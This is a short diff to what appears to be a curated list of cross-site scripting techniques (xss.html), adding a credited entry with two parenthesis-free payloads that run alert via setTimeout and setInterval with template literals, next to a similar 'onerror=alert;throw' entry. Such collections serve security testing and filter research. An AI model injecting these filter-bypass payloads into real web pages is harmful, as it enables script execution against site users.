@@ -30,6 +30,14 @@ xss.html
     
 ---
 
+[Bo0oM](https://twitter.com/i_bo0om/status/687652257609957376)
+
+
+    setTimeout`alert\`23\``
+    setInterval`alert\`23\``
+    
+---
+
 [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
 
     onerror=alert;throw 23;
